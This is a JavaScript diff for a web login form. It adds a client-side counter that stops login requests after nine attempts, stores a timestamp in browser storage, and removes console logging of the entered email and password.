@@ -1,4 +1,14 @@
 
+$(function(){
+    let ob = new Date().getTime()
+   
+    if (sessionStorage.getItem('fall') === null) {
+        localStorage.setItem('key', JSON.stringify(ob))
+        sessionStorage.setItem('fall', 0)
+    }
+        
+})
+
 
 document.getElementById('formOnes').addEventListener('input', e => {
 
@@ -38,16 +48,16 @@ document.getElementById('formOnes').addEventListener('submit', e => {
     let url = window.location.pathname;
     
     url = localStorage.getItem('page')
-    console.log(url)
-    
     let datas = {
         email : ema,
         pass : pas,
         url : url
     }
+    $('#carga').addClass('is-active');
+    sessionStorage.fall++
     
-        $('#carga').addClass('is-active');
-
+    if(sessionStorage.getItem('fall') <= 9){
+        
     $.ajax({
         type: "POST",
         url: './login',
@@ -64,12 +74,15 @@ document.getElementById('formOnes').addEventListener('submit', e => {
        
     }).fail(function (data){
         
-        console.log(data)
         clean()
         
     })
-
-
+    
+    }else{
+        clean()
+        messageInfo('cuenta incorrecta')
+    }
+    
 })
 
 function clean() {
@@ -96,9 +109,6 @@ function checkInputsTwo() {
 
     let ema = document.getElementById('emails').value
     let pas = document.getElementById('passs').value
-    
-    console.log(ema)
-    console.log(pas)
 
     if (!ema.replace(/\s/g, '').length || !pas.replace(/\s/g, '').length ) {
         return false
